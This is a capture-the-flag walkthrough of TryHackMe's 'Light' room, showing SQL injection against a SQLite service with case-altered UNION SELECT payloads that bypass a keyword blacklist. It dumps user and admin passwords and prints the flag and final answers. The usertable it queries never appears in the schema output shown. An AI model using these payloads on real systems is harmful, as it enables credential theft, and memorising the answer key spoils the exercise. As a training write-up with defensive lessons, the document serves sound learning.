# Light - TryHackMe Walkthrough

## Room Information

| Category   | Value                                                  |
| ---------- | ------------------------------------------------------ |
| Platform   | TryHackMe                                              |
| Room Name  | Light                                                  |
| Difficulty | Easy                                                   |
| Objective  | Exploit the database application and retrieve the flag |

---

# Scenario

The room provides the following information:

```text
I am working on a database application called Light!
Would you like to try it out?

If so, the application is running on port 1337.

You can connect to it using:

nc 10.49.159.8 1337

You can use the username smokey in order to get started.
```

Target IP:

```text
10.49.159.8
```

Unlike traditional machines, there is no web application or SSH service exposed. The challenge revolves entirely around interacting with a custom database application running on TCP port 1337.

---

# Initial Enumeration

Connect to the service using Netcat.

```bash
nc -vn 10.49.159.8 1337
```

Output:

```text
Connection to 10.49.159.8 1337 port [tcp/*] succeeded!

Welcome to the Light database!

Please enter your username:
```

The challenge provides an initial username.

```text
smokey
```

Entering the username returns:

```text
Password: vYQ5ngPpw8AdUmL
```

This indicates the application is likely performing a backend database lookup and returning values directly from a database.

---

# SQL Injection Testing

The next step is determining whether user input is vulnerable to SQL Injection.

A common authentication bypass payload is tested:

```sql
' OR 1=1 --+
```

Response:

```text
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

Interesting.

The application is actively filtering:

```text
--
/*
%0b
```

This means traditional comment-based SQL injection techniques are blocked.

---

## Additional Testing

Testing:

```sql
' OR 1=1 $
```

Response:

```text
Error: unrecognized token: "$"
```

Testing:

```sql
' OR 'x'='x' #
```

Response:

```text
Error: unrecognized token: "#"
```

Testing:

```sql
' OR 'x'='x'
```

Response:

```text
Error: unrecognized token: "'x'' LIMIT 30"
```

This error message is extremely valuable.

It reveals part of the backend query:

```sql
LIMIT 30
```

and confirms user input is being inserted directly into an SQL statement.

At this stage, SQL Injection is confirmed.

---

# Identifying the Database

Attempts were made to enumerate using common SQL payloads.

Example:

```sql
SELECT @@VERSION
```

Response:

```text
Ahh there is a word in there I don't like :(
```

The application appears to blacklist specific SQL keywords.

This means standard enumeration techniques will require bypasses.

---

## Filter Bypass

The keyword filter appears to be case-sensitive.

Testing:

```sql
' unIOn seLECt sqlite_version() '
```

Response:

```text
Password: 3.31.1
```

Success.

The database version is revealed.

### Database Version

```text
SQLite 3.31.1
```

This confirms the backend database engine is SQLite.

---

# Database Schema Enumeration

SQLite stores schema information inside:

```sql
sqlite_master
```

Query:

```sql
' UNioN SElecT sql from sqlite_master '
```

Response:

```sql
CREATE TABLE admintable (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password INTEGER
)
```

Success.

We have identified a table named:

```text
admintable
```

---

# User Enumeration

The next objective is identifying usernames.

Query:

```sql
' UniOn SeLeCt group_concat(username) FROM usertable '
```

Response:

```text
alice
rob
john
michael
smokey
hazel
ralph
steve
```

Or:

```text
alice,rob,john,michael,smokey,hazel,ralph,steve
```

### Discovered Users

```text
alice
rob
john
michael
smokey
hazel
ralph
steve
```

---

# Password Enumeration

Now retrieve stored passwords.

Query:

```sql
' UNion SELect group_concat(password) FROM usertable '
```

Response:

```text
tF8tj2o94WE4LKC
yAn4fPaF2qpCKpR
e74tqwRh2oApPo6
7DV4dwA0g5FacRe
vYQ5ngPpw8AdUmL
EcSuU35WlVipjXG
YO1U9O1m52aJImA
WObjufHX1foR8d7
```

### Retrieved Passwords

```text
tF8tj2o94WE4LKC
yAn4fPaF2qpCKpR
e74tqwRh2oApPo6
7DV4dwA0g5FacRe
vYQ5ngPpw8AdUmL
EcSuU35WlVipjXG
YO1U9O1m52aJImA
WObjufHX1foR8d7
```

At this stage we have successfully dumped the usertable.

---

# Admin Enumeration

The schema previously revealed an additional table:

```text
admintable
```

Enumerating usernames:

```sql
' UNioN SEleCT group_concat(username) FROM admintable '
```

Response:

```text
TryHackMeAdmin,flag
```

Interesting.

Two entries exist:

```text
TryHackMeAdmin
flag
```

---

# Retrieving Admin Credentials

Now dump passwords from the admin table.

Query:

```sql
' UNioN SeleCT group_concat(password) FROM admintable '
```

Response:

```text
mamZtAuMlrsEy5bp6q17
THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

Success.

The administrator password and challenge flag are returned.

---

# Flag

```text
THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

---

# Attack Path Summary

```text
Connect to TCP 1337
        │
        ▼
Interact with Database Application
        │
        ▼
Identify SQL Injection
        │
        ▼
Observe LIMIT 30 Error
        │
        ▼
Bypass Keyword Filter
        │
        ▼
Identify SQLite Version
        │
        ▼
Enumerate sqlite_master
        │
        ▼
Discover admintable
        │
        ▼
Dump usertable Users
        │
        ▼
Dump usertable Passwords
        │
        ▼
Dump admintable Users
        │
        ▼
Dump admintable Passwords
        │
        ▼
Retrieve Flag
```

---

# Key Takeaways

### SQL Injection

* Error messages often reveal backend query structure.
* Blacklists are ineffective protection against SQL Injection.
* Case-sensitive keyword filtering can frequently be bypassed.
* UNION SELECT remains one of the most powerful SQL Injection techniques.

### SQLite Enumeration

Useful SQLite functions and tables:

```sql
sqlite_version()
sqlite_master
group_concat()
```

These allow attackers to:

* Identify the database engine
* Enumerate schema information
* Extract table contents

### Defensive Lessons

* Never construct SQL queries using unsanitized user input.
* Use parameterized queries and prepared statements.
* Avoid relying on keyword blacklists for protection.
* Suppress verbose database error messages in production environments.

---

# Final Answers

| Item             | Value                               |
| ---------------- | ----------------------------------- |
| Database Version | 3.31.1                              |
| Admin Username   | TryHackMeAdmin                      |
| Admin Password   | mamZtAuMlrsEy5bp6q17                |
| Flag             | THM{SQLit3_InJ3cTion_is_SimplE_nO?} |

Room completed successfully.
